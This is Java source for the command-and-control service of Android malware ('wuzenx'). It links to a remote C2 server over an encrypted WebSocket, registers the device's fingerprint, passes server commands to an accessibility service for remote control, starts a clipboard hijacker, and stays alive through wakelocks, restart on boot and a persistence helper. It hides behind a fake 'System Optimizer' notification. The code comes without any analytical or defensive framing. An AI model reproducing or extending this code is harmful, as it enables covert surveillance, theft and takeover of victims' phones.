package com.wuzenx;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;

import com.wuzenx.services.WuzenAccessibilityService;
import com.wuzenx.utils.ClipboardHijacker;
import com.wuzenx.utils.Crypto;
import com.wuzenx.utils.Persistence;

import org.java_websocket.client.WebSocketClient;
import org.java_websocket.handshake.ServerHandshake;

import org.json.JSONObject;

import java.net.URI;
import java.util.UUID;

public class C2Service extends Service {
    public static C2Service instance = null;

    private WebSocketClient ws = null;
    private Handler handler = new Handler(Looper.getMainLooper());
    private long reconnectDelay = 3000L;
    private String wuzenDeviceId = "";
    private PowerManager.WakeLock wakeLock = null;
    private ClipboardHijacker clipboardHijacker = null;
    private boolean isRunning = false;
    private int wsReconnectAttempts = 0;

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        Config.load(this);

        SharedPreferences prefs = getSharedPreferences("wuzenx", MODE_PRIVATE);
        wuzenDeviceId = prefs.getString("device_id", null);
        if (wuzenDeviceId == null) {
            wuzenDeviceId = UUID.randomUUID().toString().replace("-", "").substring(0, 16);
            prefs.edit().putString("device_id", wuzenDeviceId).apply();
        }

        startForeground(1, createNotification());
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        if (pm != null) {
            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "wuzenx:keepalive");
            wakeLock.acquire(10 * 60 * 1000L);
        }

        Persistence.keepAlive(this);
        clipboardHijacker = new ClipboardHijacker(this, this);
        connect();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
            Persistence.keepAlive(this);
        }
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        instance = null;
        isRunning = false;
        if (ws != null) {
            ws.close();
            ws = null;
        }
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
        if (clipboardHijacker != null) clipboardHijacker.stop();
        handler.removeCallbacksAndMessages(null);
        Persistence.keepAlive(this);
        super.onDestroy();
    }

    private void connect() {
        if (isRunning) return;
        isRunning = true;

        try {
            ws = new WebSocketClient(new URI(Config.SERVER_URL)) {
                @Override
                public void onOpen(ServerHandshake handshakedata) {
                    reconnectDelay = 3000L;
                    wsReconnectAttempts = 0;

                    JSONObject reg = new JSONObject();
                    try {
                        reg.put("type", "register");
                        reg.put("deviceId", wuzenDeviceId);
                        JSONObject info = new JSONObject();
                        info.put("model", Build.MODEL);
                        info.put("brand", Build.BRAND);
                        info.put("android", Build.VERSION.RELEASE);
                        info.put("sdk", Build.VERSION.SDK_INT);
                        info.put("battery", getBatteryLevel());
                        info.put("device", Build.DEVICE);
                        info.put("manufacturer", Build.MANUFACTURER);
                        info.put("product", Build.PRODUCT);
                        info.put("fingerprint", Build.FINGERPRINT);
                        reg.put("info", info);
                    } catch (Exception ignored) {}
                    sendRaw(reg.toString());

                    handler.postDelayed(() -> heartbeat(), 5000L);
                    if (clipboardHijacker != null) clipboardHijacker.start();
                }

                @Override
                public void onMessage(String message) {
                    try {
                        String decrypted = Crypto.decrypt(message);
                        if (decrypted == null) return;

                        JSONObject json = new JSONObject(decrypted);
                        String type = json.optString("type");

                        if ("heartbeat_ack".equals(type)) return;

                        if (WuzenAccessibilityService.instance != null) {
                            WuzenAccessibilityService.instance.handleCommand(json);
                        }
                    } catch (Exception ignored) {}
                }

                @Override
                public void onClose(int code, String reason, boolean remote) {
                    isRunning = false;
                    handler.removeCallbacksAndMessages(null);
                    if (clipboardHijacker != null) clipboardHijacker.stop();
                    scheduleReconnect();
                }

                @Override
                public void onError(Exception ex) {
                    isRunning = false;
                    scheduleReconnect();
                }
            };
            ws.connect();
        } catch (Exception e) {
            isRunning = false;
            scheduleReconnect();
        }
    }

    private void scheduleReconnect() {
        wsReconnectAttempts++;
        long delay = Math.min(reconnectDelay, 60000L);
        reconnectDelay = Math.min(reconnectDelay * 2, 60000L);
        handler.postDelayed(() -> connect(), delay);
    }

    private void heartbeat() {
        if (ws != null && ws.isOpen()) {
            sendMessage("heartbeat", "");
            handler.postDelayed(() -> heartbeat(), 5000L);
        }
    }

    public void sendRaw(String data) {
        if (ws == null || !ws.isOpen()) return;
        try {
            ws.send(data);
        } catch (Exception ignored) {}
    }

    public void sendEncrypted(String plaintext) {
        if (ws == null || !ws.isOpen()) return;
        try {
            ws.send(Crypto.encrypt(plaintext));
        } catch (Exception ignored) {}
    }

    public void sendMessage(String type, String dataPayload) {
        try {
            JSONObject msg = new JSONObject();
            msg.put("type", type);
            msg.put("deviceId", wuzenDeviceId);
            msg.put("data", dataPayload);
            sendEncrypted(msg.toString());
        } catch (Exception ignored) {}
    }

    public void sendMessage(String type, JSONObject dataPayload) {
        sendMessage(type, dataPayload.toString());
    }

    /** FIXED: registerReceiver now uses IntentFilter, NOT Intent */
    private int getBatteryLevel() {
        try {
            IntentFilter filter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            Intent batteryIntent = registerReceiver(null, filter);
            if (batteryIntent == null) return -1;
            int level = batteryIntent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
            int scale = batteryIntent.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
            if (level >= 0 && scale > 0) return level * 100 / scale;
        } catch (Exception ignored) {}
        return -1;
    }

    @SuppressWarnings("deprecation")
    private Notification createNotification() {
        String channelId = "wuzenx_service";

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                channelId, "System Service", NotificationManager.IMPORTANCE_MIN
            );
            channel.setShowBadge(false);
            channel.enableVibration(false);
            channel.setSound(null, null);
            NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            if (nm != null) nm.createNotificationChannel(channel);
        }

        Notification.Builder builder;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder = new Notification.Builder(this, channelId);
        } else {
            builder = new Notification.Builder(this);
        }

        builder.setContentTitle("System Optimizer")
               .setContentText("Optimizing device performance...")
               .setSmallIcon(android.R.drawable.ic_menu_info_details)
               .setOngoing(true);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            builder.setForegroundServiceBehavior(Notification.FOREGROUND_SERVICE_IMMEDIATE);
        }

        return builder.build();
    }

    /** FIXED: Renamed from getDeviceId() to avoid overriding ContextWrapper.getDeviceId() which returns int */
    public String getWuzenDeviceId() { return wuzenDeviceId; }

    public Context getContext() { return this; }
}
